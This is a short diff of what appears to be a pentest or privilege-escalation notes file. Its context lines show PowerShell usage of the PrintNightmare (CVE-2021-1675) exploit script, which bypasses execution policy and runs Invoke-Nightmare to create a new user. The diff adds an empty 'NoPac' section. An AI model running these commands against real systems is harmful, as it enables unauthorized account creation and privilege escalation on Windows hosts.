@@ -122,3 +122,8 @@ Run with (in powershell):
 > powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
 > Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
 ```
+
+###### NoPac
+```
+
+```
